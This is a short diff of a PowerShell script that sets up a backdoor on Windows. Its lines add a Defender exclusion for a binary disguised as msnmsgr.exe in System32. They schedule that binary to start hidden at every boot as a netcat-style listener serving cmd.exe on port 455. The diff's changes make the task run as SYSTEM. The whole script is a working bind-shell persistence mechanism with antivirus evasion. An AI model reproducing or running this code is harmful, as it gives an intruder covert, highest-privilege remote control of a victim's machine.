@@ -54,8 +54,10 @@ Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command ""Start-Process 'C:\Windows\System32\msnmsgr.exe' -ArgumentList '-Ldp 455 -e cmd.exe' -NoNewWindow"""
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
-$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
+$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal
 Register-ScheduledTask -TaskName "nc" -InputObject $Task
+
 
 
 
